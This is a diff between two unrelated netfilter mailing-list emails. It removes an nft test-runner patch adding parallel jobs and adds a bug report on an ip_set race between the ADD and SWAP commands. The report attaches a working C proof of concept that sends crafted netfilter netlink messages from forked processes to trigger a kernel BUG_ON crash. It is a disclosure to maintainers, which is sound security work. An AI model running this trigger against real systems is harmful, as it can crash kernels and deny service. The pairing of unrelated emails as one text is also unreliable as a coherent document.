@@ -2,228 +2,267 @@ Return-Path: <netfilter-devel-owner@vger.kernel.org>
 X-Original-To: lists+netfilter-devel@lfdr.de
 Delivered-To: lists+netfilter-devel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id AC73879192B
-	for <lists+netfilter-devel@lfdr.de>; Mon,  4 Sep 2023 15:53:24 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 0CBFF791FAC
+	for <lists+netfilter-devel@lfdr.de>; Tue,  5 Sep 2023 01:38:56 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S238749AbjIDNx0 (ORCPT <rfc822;lists+netfilter-devel@lfdr.de>);
-        Mon, 4 Sep 2023 09:53:26 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:41152 "EHLO
+        id S240280AbjIDXim (ORCPT <rfc822;lists+netfilter-devel@lfdr.de>);
+        Mon, 4 Sep 2023 19:38:42 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56426 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S237621AbjIDNxY (ORCPT
+        with ESMTP id S233221AbjIDXim (ORCPT
         <rfc822;netfilter-devel@vger.kernel.org>);
-        Mon, 4 Sep 2023 09:53:24 -0400
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 0DBE3CFE
-        for <netfilter-devel@vger.kernel.org>; Mon,  4 Sep 2023 06:51:56 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-        s=mimecast20190719; t=1693835516;
-        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-         to:to:cc:cc:mime-version:mime-version:
-         content-transfer-encoding:content-transfer-encoding:
-         in-reply-to:in-reply-to:references:references;
-        bh=AoSUWY9JQq/67guYpyEf28gaFCM3e2OFBijIclCDJHo=;
-        b=M/pklE/DcX3AaYv+sjCvppWbGhMlrpULv1OTxsBE86xKAZrxQbDS1Cl7qIZkh+272GBTQI
-        cqkMztptmOvanh4fUM5vlthsIEHWZUzuutyLOt1UojSraRgz0BH4ev3s2lmRef4TPNWuwB
-        dp7hI0M5epii9no6nCzrfb3qnO+5f+Q=
-Received: from mimecast-mx02.redhat.com (mx-ext.redhat.com [66.187.233.73])
- by relay.mimecast.com with ESMTP with STARTTLS (version=TLSv1.2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- us-mta-157-Fg3oBn71Oe-h_2w4KfWUag-1; Mon, 04 Sep 2023 09:51:55 -0400
-X-MC-Unique: Fg3oBn71Oe-h_2w4KfWUag-1
-Received: from smtp.corp.redhat.com (int-mx03.intmail.prod.int.rdu2.redhat.com [10.11.54.3])
-        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
-        (No client certificate requested)
-        by mimecast-mx02.redhat.com (Postfix) with ESMTPS id C241B1C0CCA6
-        for <netfilter-devel@vger.kernel.org>; Mon,  4 Sep 2023 13:51:54 +0000 (UTC)
-Received: from localhost.localdomain (unknown [10.39.192.26])
-        by smtp.corp.redhat.com (Postfix) with ESMTPS id 427B31121318;
-        Mon,  4 Sep 2023 13:51:54 +0000 (UTC)
-From:   Thomas Haller <thaller@redhat.com>
-To:     NetFilter <netfilter-devel@vger.kernel.org>
-Cc:     Thomas Haller <thaller@redhat.com>
-Subject: [PATCH nft v3 11/11] tests/shell: support running tests in parallel
-Date:   Mon,  4 Sep 2023 15:48:13 +0200
-Message-ID: <20230904135135.1568180-12-thaller@redhat.com>
-In-Reply-To: <20230904135135.1568180-1-thaller@redhat.com>
-References: <20230904135135.1568180-1-thaller@redhat.com>
+        Mon, 4 Sep 2023 19:38:42 -0400
+Received: from mail-pl1-x634.google.com (mail-pl1-x634.google.com [IPv6:2607:f8b0:4864:20::634])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id BD8651B4
+        for <netfilter-devel@vger.kernel.org>; Mon,  4 Sep 2023 16:38:38 -0700 (PDT)
+Received: by mail-pl1-x634.google.com with SMTP id d9443c01a7336-1bdbf10333bso14498465ad.1
+        for <netfilter-devel@vger.kernel.org>; Mon, 04 Sep 2023 16:38:38 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20221208; t=1693870718; x=1694475518; darn=vger.kernel.org;
+        h=content-disposition:mime-version:message-id:subject:to:from:date
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=9D6jnPUqSoYCPVevFEI3g2975mHWxOEggMAgZNgztSw=;
+        b=C8rJ6/QmbhEIlFA6TnjZtpxP2sgJY1w7jgqkwFiKMBSDyCDErtETu4zwL3Om2OCAX/
+         Zrx8i6gtqWsL5ZaNidq3f3uCQ6f/VZugeZB9KxR1rOv2UOL/dpRJa2onXMZorbvIYDgj
+         pU5W8zmz53zdenMJgYJ++RlVhHBSSTlaz1D4oMoKWtVHQiKilfvEKg41jQsjz3IblUGX
+         9n3RmPf2v5T2Y6dDPyMT/yyhy6RZf8kYFktdE5v9x+fMx0yX+pv4KvkN3lU7n36c2bqn
+         LHzDp/u/7RamZHQJ5h5Pnql1UIG75VfWUowtwkZMlSRtRxiS1IzExt1YJjXGUQbP5eGg
+         bTZQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20221208; t=1693870718; x=1694475518;
+        h=content-disposition:mime-version:message-id:subject:to:from:date
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=9D6jnPUqSoYCPVevFEI3g2975mHWxOEggMAgZNgztSw=;
+        b=GRAJ19EUZYw1V1Ta9Wg6oyA1S80aTHVOqP7e6HYGgyy89xqqPxSNAcB2ofwaKxAFJg
+         WQtbwCzCe5W6fvX7RgxOwoV2OyQopkhQCqDC86jHRtcMuuyuDKiC9y5jg03d5V0ahbOq
+         5QQq5cvliRi5tJGKNFG6ApDqUg3/dDjEwhZlT/tBHi5hayOtuIN14kqfAzVMMl/B6jFn
+         EoUMgN5sNZ2TPA3bz1O2GVX5JO8yNfEsIqTqrG3TgSiUZT6tCkCJ2/j0srqQ609V3t8R
+         eF+ohiW6XMcj66neNytziDjmnCreiGjUyQVmXyRzqa7fMYssatbPDeuAczWhIlxVorA2
+         jEsQ==
+X-Gm-Message-State: AOJu0YxxwgCJynjxU1y2EHC+Tqyy8dcj03x2NErexm7qICXkE1z+4GuT
+        f8mE2iVzmrTcXP4ZbDi568VS0iyoyCqUDBlbIU0=
+X-Google-Smtp-Source: AGHT+IHs/4oBo8cdYQozMsDLE6/akw+v1ib5TedfSONvQLZ2TN1iqZsaM7pnO8ngq9sG3xXEwo2MoA==
+X-Received: by 2002:a17:903:26ce:b0:1b8:4f93:b210 with SMTP id jg14-20020a17090326ce00b001b84f93b210mr10952328plb.45.1693870717770;
+        Mon, 04 Sep 2023 16:38:37 -0700 (PDT)
+Received: from westworld (209-147-138-147.nat.asu.edu. [209.147.138.147])
+        by smtp.gmail.com with ESMTPSA id 13-20020a170902c24d00b001bb1f0605b2sm8014741plg.214.2023.09.04.16.38.36
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 04 Sep 2023 16:38:37 -0700 (PDT)
+Date:   Mon, 4 Sep 2023 16:38:34 -0700
+From:   Kyle Zeng <zengyhkyle@gmail.com>
+To:     netfilter-devel@vger.kernel.org, davem@davemloft.net,
+        pablo@netfilter.org, kadlec@netfilter.org, edumazet@google.com
+Subject: Race between IPSET_CMD_CREATE and IPSET_CMD_SWAP
+Message-ID: <ZPZqetxOmH+w/myc@westworld>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-X-Scanned-By: MIMEDefang 3.1 on 10.11.54.3
-X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,
-        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H4,RCVD_IN_MSPIKE_WL,
-        SPF_HELO_NONE,SPF_NONE autolearn=ham autolearn_force=no version=3.4.6
+Content-Type: multipart/mixed; boundary="WxjOptb85JCDmtnW"
+Content-Disposition: inline
+X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
+        RCVD_IN_DNSWL_BLOCKED,SPF_HELO_NONE,SPF_PASS,WEIRD_QUOTING
+        autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <netfilter-devel.vger.kernel.org>
 X-Mailing-List: netfilter-devel@vger.kernel.org
 
-Add option to enable running jobs in parallel. The purpose is to speed
-up the run time of the tests.
 
-The global cleanup (removal of kernel modules) interferes with parallel
-jobs (or even with, unrelated jobs on the system). By setting
-NFT_TEST_JOBS= to a positive number, that cleanup is skipped.
+--WxjOptb85JCDmtnW
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-Signed-off-by: Thomas Haller <thaller@redhat.com>
----
- tests/shell/run-tests.sh | 83 +++++++++++++++++++++++++++++++++-------
- 1 file changed, 69 insertions(+), 14 deletions(-)
+Hi,
 
-diff --git a/tests/shell/run-tests.sh b/tests/shell/run-tests.sh
-index 1451d913bd3a..160524e889ed 100755
---- a/tests/shell/run-tests.sh
-+++ b/tests/shell/run-tests.sh
-@@ -41,6 +41,7 @@ usage() {
- 	echo " -R|--without-realroot : sets NFT_TEST_HAVE_REALROOT=n"
- 	echo " -U|--no-unshare  : sets NFT_TEST_NO_UNSHARE=y"
- 	echo " -k|--keep-logs   : sets NFT_TEST_KEEP_LOGS=y"
-+	echo " -j|--jobs        : sets NFT_TEST_JOBS=12"
- 	echo
- 	echo "ENVIRONMENT VARIABLES:"
- 	echo " NFT=<PATH>   : Path to nft executable"
-@@ -69,6 +70,10 @@ usage() {
- 	echo "                Set to empty to not unshare. You may want to export NFT_TEST_IS_UNSHARED="
- 	echo "                and NFT_TEST_HAVE_REALROOT= accordingly."
- 	echo " NFT_TEST_KEEP_LOGS=*|y: Keep the temp directory. On success, it will be deleted by default."
-+	echo " NFT_TEST_JOBS=<NUM}>: by default, run test sequentially. Set to an integer > 1 to"
-+	echo "                run jobs in parallel. Leaving this unset or at zero means to run jobs sequentially"
-+	echo "                and perform global cleanups between tests (remove kernel modules). Setting this"
-+	echo "                to a positive number (including \"1\") means to disable such global cleanups."
- }
- 
- NFT_TEST_BASEDIR="$(dirname "$0")"
-@@ -83,6 +88,7 @@ KMEMLEAK="$KMEMLEAK"
- NFT_TEST_KEEP_LOGS="$NFT_TEST_KEEP_LOGS"
- NFT_TEST_HAVE_REALROOT="$NFT_TEST_HAVE_REALROOT"
- NFT_TEST_NO_UNSHARE="$NFT_TEST_NO_UNSHARE"
-+NFT_TEST_JOBS="$NFT_TEST_JOBS"
- DO_LIST_TESTS=
- 
- TESTS=()
-@@ -119,6 +125,9 @@ while [ $# -gt 0 ] ; do
- 		-U|--no-unshare)
- 			NFT_TEST_NO_UNSHARE=y
- 			;;
-+		-j|--jobs)
-+			NFT_TEST_JOBS=12
-+			;;
- 		--)
- 			TESTS+=( "$@" )
- 			shift $#
-@@ -132,6 +141,11 @@ while [ $# -gt 0 ] ; do
- 	esac
- done
- 
-+# normalize the jobs number to be an integer.
-+case "$NFT_TEST_JOBS" in
-+	''|*[!0-9]*) NFT_TEST_JOBS=0 ;;
-+esac
-+
- find_tests() {
- 	find "$1" -type f -executable | sort
- }
-@@ -199,13 +213,15 @@ ${NFT} > /dev/null 2>&1
- ret=$?
- if [ ${ret} -eq 126 ] || [ ${ret} -eq 127 ]; then
- 	msg_error "cannot execute nft command: ${NFT}"
--else
--	msg_info "using nft command: ${NFT}"
- fi
-+msg_info "using nft command: ${NFT}"
-+msg_info "parallel job mode: NFT_TEST_JOBS=$NFT_TEST_JOBS"
- 
--MODPROBE="$(which modprobe)"
--if [ ! -x "$MODPROBE" ] ; then
--	msg_error "no modprobe binary found"
-+if [ "$NFT_TEST_JOBS" -eq 0 ] ; then
-+	MODPROBE="$(which modprobe)"
-+	if [ ! -x "$MODPROBE" ] ; then
-+		msg_error "no modprobe binary found"
-+	fi
- fi
- 
- DIFF="$(which diff)"
-@@ -231,6 +247,11 @@ export NFT_TEST_TMPDIR
- 
- 
- kernel_cleanup() {
-+	if [ "$NFT_TEST_JOBS" -ne 0 ] ; then
-+		# When we run jobs in parallel (even with only one "parallel"
-+		# job via `NFT_TEST_JOBS=1`), we skip such global cleanups.
-+		return
-+	fi
- 	if [ "$NFT_TEST_IS_UNSHARED" != y ] ; then
- 		$NFT flush ruleset
- 	fi
-@@ -403,23 +424,57 @@ print_test_result() {
- 	fi
- }
- 
--for testfile in "${TESTS[@]}" ; do
--	kernel_cleanup
-+declare -A JOBS_TEMPDIR
-+declare -A JOBS_PIDLIST
- 
--	# We also create and export a test-specific temporary directory.
--	NFT_TEST_TESTTMPDIR="$(mktemp -p "$NFT_TEST_TMPDIR" -d "test-${testfile//\//-}.XXXXXX")"
--	export NFT_TEST_TESTTMPDIR
-+job_start() {
-+	local testfile="$1"
- 
--	print_test_header I "$testfile" "EXECUTING" ""
-+	if [ "$NFT_TEST_JOBS" -le 1 ] ; then
-+		print_test_header I "$testfile" "EXECUTING" ""
-+	fi
-+
-+	NFT_TEST_TESTTMPDIR="${JOBS_TEMPDIR["$testfile"]}" \
- 	NFT="$NFT" DIFF="$DIFF" DUMPGEN="$DUMPGEN" $NFT_TEST_UNSHARE_CMD "$NFT_TEST_BASEDIR/helpers/test-wrapper.sh" "$testfile"
- 	rc_got=$?
--	echo -en "\033[1A\033[K" # clean the [EXECUTING] foobar line
- 
--	print_test_result "$NFT_TEST_TESTTMPDIR" "$testfile" "$rc_got"
-+	if [ "$NFT_TEST_JOBS" -le 1 ] ; then
-+		echo -en "\033[1A\033[K" # clean the [EXECUTING] foobar line
-+	fi
-+
-+	return "$rc_got"
-+}
-+
-+job_wait()
-+{
-+	local num_jobs="$1"
-+
-+	while [ "$JOBS_N_RUNNING" -gt 0 -a "$JOBS_N_RUNNING" -ge "$num_jobs" ] ; do
-+		wait -n -p JOBCOMPLETED
-+		rc_got="$?"
-+		testfile2="${JOBS_PIDLIST[$JOBCOMPLETED]}"
-+		print_test_result "${JOBS_TEMPDIR["$testfile2"]}" "$testfile2" "$rc_got"
-+		((JOBS_N_RUNNING--))
-+		check_kmemleak
-+	done
-+}
-+
-+JOBS_N_RUNNING=0
-+for testfile in "${TESTS[@]}" ; do
-+	kernel_cleanup
-+
-+	job_wait "$NFT_TEST_JOBS"
- 
--	check_kmemleak
-+	NFT_TEST_TESTTMPDIR="$(mktemp -p "$NFT_TEST_TMPDIR" -d "test-${testfile//\//-}.XXXXXX")"
-+	JOBS_TEMPDIR["$testfile"]="$NFT_TEST_TESTTMPDIR"
-+
-+	job_start "$testfile" &
-+	JOBS_PIDLIST[$!]="$testfile"
-+	((JOBS_N_RUNNING++))
- done
- 
-+job_wait 0
-+
- echo ""
- 
- # kmemleak may report suspected leaks
--- 
-2.41.0
+There is a race between IPSET_CMD_ADD and IPSET_CMD_SWAP in netfilter/ip_set, which can lead to the invocation of `__ip_set_put` on a wrong `set`, triggering the `BUG_ON(set->ref == 0);` check in it.
 
+More specifically, in `ip_set_swap`, it will hold the `ip_set_ref_lock`
+and then do the following to swap the sets:
+~~~
+	strncpy(from_name, from->name, IPSET_MAXNAMELEN);
+	strncpy(from->name, to->name, IPSET_MAXNAMELEN);
+	strncpy(to->name, from_name, IPSET_MAXNAMELEN);
+
+	swap(from->ref, to->ref);
+~~~
+But in the retry loop in `call_ad`:
+~~~
+		if (retried) {
+			__ip_set_get(set);
+			nfnl_unlock(NFNL_SUBSYS_IPSET);
+			cond_resched();
+			nfnl_lock(NFNL_SUBSYS_IPSET);
+			__ip_set_put(set);
+		}
+~~~
+No lock is hold, when it does the `cond_resched()`.
+As a result, `ip_set_ref_lock` (in thread 2) can swap the set with another when thread
+1 is doing the `cond_resched()`. When it wakes up, the `set` variable
+alreays means another `set`, calling `__ip_set_put` on it will decrease
+the refcount on the wrong `set`, triggering the `BUG_ON` call.
+
+I'm not sure what is the proper way to fix this issue so I'm asking for
+help.
+
+A proof-of-concept code that can trigger the bug is attached.
+
+The bug is confirmed on v5.10, v6.1, v6.5.rc7 and upstream.
+
+Best,
+Kyle
+
+--WxjOptb85JCDmtnW
+Content-Type: text/x-csrc; charset=us-ascii
+Content-Disposition: attachment; filename="poc.c"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+#include <assert.h>
+#include <sys/socket.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <linux/netfilter/nfnetlink.h>
+
+#include <stdint.h>
+
+int nl_sock;
+
+void *build_pkt(struct nlmsghdr *hdr, struct nfgenmsg *nfgenmsg, void *attrs, int attr_len)
+{
+    void *payload = calloc(1, 0x1000);
+    void *ptr = payload;
+    hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg) + attr_len;
+	//printf("%#x %#x %#x\n", sizeof(struct nlmsghdr), sizeof(struct nfgenmsg), attr_len);
+    //printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
+    //printf("attr_len: %#x\n", attr_len);
+
+    memcpy(ptr, hdr, sizeof(struct nlmsghdr));
+    ptr += sizeof(struct nlmsghdr);
+    memcpy(ptr, nfgenmsg, sizeof(struct nfgenmsg));
+    ptr += sizeof(struct nfgenmsg);
+    memcpy(ptr, attrs, attr_len);
+    return payload;
+}
+
+void func1()
+{
+	struct nlmsghdr nlmsghdr = {
+		.nlmsg_len = 0,
+		.nlmsg_type = 0x609, // IPSET_CMD_ADD(9)  | subsys_id = NFNL_SUBSYS_IPSET(6)
+		.nlmsg_flags = 1, // NLM_F_REQUEST(1)
+		.nlmsg_seq = 0, // NL_AUTO_SEQ
+		.nlmsg_pid = 0 // NL_AUTO_PID
+	};
+
+	struct nfgenmsg nfgenmsg = {
+		.nfgen_family = 0,
+		.version = 0,
+		.res_id = 0
+	};
+
+	char attrs[] =	"\x05\x00""\x01\x00""\x07\x00\x00\x00"		// IPSET_ATTR_PROTOCO, protocol is hardcoded to 7
+					"\x09\x00""\x02\x00""set2\x00\x00\x00\x00"	// IPSET_ATTR_SETNAME
+					"\x54\x00""\x07\x80"						// IPSET_ATTR_DATA
+						"\x06\x00""\x04\x40""\x00\x00\x00\x00"	// IPSET_ATTR_PORT_FROM
+						"\x06\x00""\x05\x40""\x4e\x00\x00\x00"	// IPSET_ATTR_PORT_TO
+						"\x05\x00""\x07\x00""\x11\x00\x00\x00"	// IPSET_ATTR_PROTO => IPPROTO_UDP, just a protocol that has ports (ip_set_proto_with_ports)
+						"\x08\x00""\x08\x40""\x00\x00\x00\x00"
+						"\x18\x00""\x14\x80"
+							"\x14\x00""\x02\x40""\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa"
+						"\x18\x00""\x01\x80"
+							"\x14\x00""\x02\x40""\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\xff\xff\x7f\x00\x00\x01";
+	void *payload = build_pkt(&nlmsghdr, &nfgenmsg, attrs, sizeof(attrs)-1);
+	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);
+}
+
+void func2()
+{
+	struct nlmsghdr nlmsghdr = {
+		.nlmsg_len = 0,
+		.nlmsg_type = 0x606, // IPSET_CMD_SWAP(6)  | subsys_id = NFNL_SUBSYS_IPSET(6)
+		.nlmsg_flags = 1, // NLM_F_REQUEST(1)
+		.nlmsg_seq = 0, // NL_AUTO_SEQ
+		.nlmsg_pid = 0 // NL_AUTO_PID
+	};
+
+	struct nfgenmsg nfgenmsg = {
+		.nfgen_family = 0,
+		.version = 0,
+		.res_id = 0
+	};
+
+	char attrs[] =	"\x09\x00""\x03\x00""set1\x00\x00\x00\x00"
+					"\x05\x00""\x01\x00""\x07\x00\x00\x00"		// IPSET_ATTR_PROTOCO, protocol is hardcoded to 7
+					"\x09\x00""\x02\x00""set2\x00\x00\x00\x00";
+
+	void *payload = build_pkt(&nlmsghdr, &nfgenmsg, attrs, sizeof(attrs)-1);
+	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);
+}
+
+void context_setup()
+{
+	nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+
+	struct nlmsghdr nlmsghdr1 = {
+		.nlmsg_len = 0,
+		.nlmsg_type = 0x602, // IPSET_CMD_CREATE(2)  | subsys_id = NFNL_SUBSYS_IPSET(6)
+		.nlmsg_flags = 0x1, // NLM_F_REQUEST(1)
+		.nlmsg_seq = 0, // NL_AUTO_SEQ
+		.nlmsg_pid = 0 // NL_AUTO_PID
+	};
+
+	struct nfgenmsg nfgenmsg1 = {
+		.nfgen_family = 0,
+		.version = 0,
+		.res_id = 0
+	};
+
+	char attrs1[] =	"\x09\x00""\x02\x00""set2\x00\x00\x00\x00"
+					"\x05\x00""\x04\x00""\x00\x00\x00\x00"					// IPSET_ATTR_REVISION
+					"\x15\x00""\x03\x00""hash:ip,port,net\x00\x00\x00\x00"
+					"\x05\x00""\x05\x00""\x0a\x00\x00\x00"					// IPSET_ATTR_FAMILY => NFPROTO_IPV6(0xa)
+					"\x05\x00""\x01\x00""\x07\x00\x00\x00";
+
+	void *payload1 = build_pkt(&nlmsghdr1, &nfgenmsg1, attrs1, sizeof(attrs1)-1);
+	send(nl_sock, payload1, nlmsghdr1.nlmsg_len, 0);
+
+	struct nlmsghdr nlmsghdr2 = {
+		.nlmsg_len = 0,
+		.nlmsg_type = 0x602, // IPSET_CMD_CREATE(2)  | subsys_id = NFNL_SUBSYS_IPSET(6)
+		.nlmsg_flags = 0x1, // NLM_F_REQUEST(1)
+		.nlmsg_seq = 0, // NL_AUTO_SEQ
+		.nlmsg_pid = 0 // NL_AUTO_PID
+	};
+
+	struct nfgenmsg nfgenmsg2 = {
+		.nfgen_family = 0,
+		.version = 0,
+		.res_id = 0
+	};
+
+	char attrs2[] =	"\x05\x00""\x05\x00""\x0a\x00\x00\x00"					// IPSET_ATTR_FAMILY => NFPROTO_IPV6(0xa)
+					"\x09\x00""\x02\x00""set1\x00\x00\x00\x00"
+					"\x15\x00""\x03\x00""hash:ip,port,net\x00\x00\x00\x00"
+					"\x05\x00""\x04\x00""\x00\x00\x00\x00"					// IPSET_ATTR_REVISION
+					"\x05\x00""\x01\x00""\x07\x00\x00\x00";
+
+	void *payload2 = build_pkt(&nlmsghdr2, &nfgenmsg2, attrs2, sizeof(attrs2)-1);
+	send(nl_sock, payload2, nlmsghdr2.nlmsg_len, 0);
+}
+
+int main(void)
+{
+	context_setup();
+	if(!fork()) func1();
+	if(!fork()) func2();
+	getchar();
+	return 0;
+}
+
+--WxjOptb85JCDmtnW--
